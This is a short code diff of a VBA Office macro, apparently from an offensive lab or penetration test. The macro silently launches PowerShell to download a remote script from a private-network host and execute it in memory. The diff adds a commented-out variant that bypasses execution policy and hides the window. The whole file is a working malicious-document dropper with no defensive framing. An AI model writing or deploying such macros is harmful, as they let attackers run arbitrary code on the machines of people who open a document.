@@ -4,6 +4,7 @@
 Sub MyMacro()
     Dim str As String
     str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.19.128:8000/run.ps1') | IEX"
+    #str = ""powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.19.128:8000/buf.ps1'))""
     Shell str, vbHide
 End Sub
 
